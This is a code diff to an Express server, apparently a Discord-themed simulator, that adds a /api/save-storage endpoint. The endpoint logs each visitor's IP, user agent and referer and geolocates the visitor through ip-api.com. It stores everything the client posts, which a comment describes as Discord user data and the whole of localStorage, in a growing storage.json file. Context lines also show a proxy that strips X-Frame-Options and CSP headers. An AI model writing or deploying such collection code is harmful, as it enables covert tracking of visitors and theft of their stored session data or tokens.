@@ -1,6 +1,8 @@
 const express = require('express');
 const session = require('express-session');
 const path = require('path');
+const fs = require('fs');
+const os = require('os');
 const crypto = require('crypto'); // Built-in Node module for secure random generation
 require('dotenv').config();
 
@@ -63,8 +65,9 @@ app.get('/', (req, res) => {
 
 
 // Middleware (important for POST)
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+app.set('trust proxy', true);
 
 /* ═══════════════════════════════════════════════════════════════
    🌐 WEB PROXY — strips X-Frame-Options/CSP so the simulator's
@@ -490,6 +493,95 @@ app.get('/api/auth/user', (req, res) => {
         return res.json(null);
     }
     res.json(req.session.user);
+});
+
+/* =======================
+   💾 SAVE DATABASE → storage.json
+   Captures: user data, settings, VM specs, IP, MAC (server-side), location (geo-IP)
+======================= */
+app.post('/api/save-storage', async (req, res) => {
+    try {
+        const STORAGE_FILE = path.join(__dirname, 'storage.json');
+
+        // 1) Resolve client IP — Replit puts the real client IP in x-forwarded-for
+        const xff = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
+        let ip = xff || req.socket.remoteAddress || '';
+        ip = ip.replace(/^::ffff:/, ''); // strip IPv4-in-IPv6 prefix
+        if (ip === '::1') ip = '127.0.0.1';
+
+        // 2) Look up location from IP (free, no key — ip-api.com)
+        let location = { source: 'ip-api.com', status: 'skipped' };
+        const isPrivate = !ip || /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.|::1$|fc|fd)/i.test(ip);
+        if (!isPrivate) {
+            try {
+                const geo = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as`, { signal: AbortSignal.timeout(4000) });
+                const j = await geo.json();
+                location = { source: 'ip-api.com', ...j };
+            } catch (e) {
+                location.status = 'error';
+                location.error = e.message;
+            }
+        } else {
+            location.status = 'private-ip';
+            location.note = 'Local/private IP — no geolocation available';
+        }
+
+        // 3) MAC: browsers cannot expose the user's real MAC for privacy. We log the SERVER's network interfaces so you have *some* MAC reference.
+        const ifaces = os.networkInterfaces();
+        const serverMacs = [];
+        for (const name in ifaces) {
+            for (const iface of ifaces[name]) {
+                if (!iface.internal && iface.mac && iface.mac !== '00:00:00:00:00:00') {
+                    serverMacs.push({ interface: name, mac: iface.mac, family: iface.family, address: iface.address });
+                }
+            }
+        }
+
+        // 4) Build the record
+        const record = {
+            savedAt: new Date().toISOString(),
+            client: {
+                ip,
+                ipForwardedFor: req.headers['x-forwarded-for'] || null,
+                userAgent: req.headers['user-agent'] || null,
+                acceptLanguage: req.headers['accept-language'] || null,
+                referer: req.headers['referer'] || null,
+                mac: 'Not available — browsers do not expose MAC addresses for privacy',
+                location
+            },
+            server: {
+                hostname: os.hostname(),
+                platform: os.platform(),
+                macAddresses: serverMacs
+            },
+            // Everything the client posted (windowsUserData, vmSpecs, discord_user_data, ALL of localStorage, etc.)
+            payload: req.body || {}
+        };
+
+        // 5) Append to storage.json (keeps a history of every save)
+        let store = { records: [] };
+        if (fs.existsSync(STORAGE_FILE)) {
+            try {
+                const raw = fs.readFileSync(STORAGE_FILE, 'utf8');
+                store = JSON.parse(raw);
+                if (!Array.isArray(store.records)) store.records = [];
+            } catch {
+                // Corrupt — back it up and start fresh
+                fs.renameSync(STORAGE_FILE, STORAGE_FILE + '.corrupt-' + Date.now());
+                store = { records: [] };
+            }
+        }
+        store.records.push(record);
+        store.lastSavedAt = record.savedAt;
+        store.totalRecords = store.records.length;
+        fs.writeFileSync(STORAGE_FILE, JSON.stringify(store, null, 2), 'utf8');
+
+        log.success(`Saved record #${store.records.length} to storage.json (ip=${ip}, city=${location.city || 'n/a'})`);
+        res.json({ ok: true, recordNumber: store.records.length, savedAt: record.savedAt, ip, location, file: 'storage.json' });
+    } catch (e) {
+        log.error('save-storage failed: ' + e.message);
+        res.status(500).json({ ok: false, error: e.message });
+    }
 });
 
 log.warn("Failed Loading /database/token/granter")
